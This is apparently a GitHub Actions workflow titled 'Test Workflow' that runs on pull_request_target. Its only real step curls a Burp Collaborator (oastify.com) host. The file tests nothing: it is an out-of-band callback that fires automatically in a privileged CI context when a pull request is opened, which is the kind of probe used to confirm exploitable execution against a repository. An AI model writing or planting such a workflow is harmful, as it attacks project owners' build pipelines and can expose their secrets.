name: Test Workflow

on: [pull_request_target]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: |
    
          curl "http://h6o6d01tgv3mz664rgdi3wvkub02ovck.oastify.com"
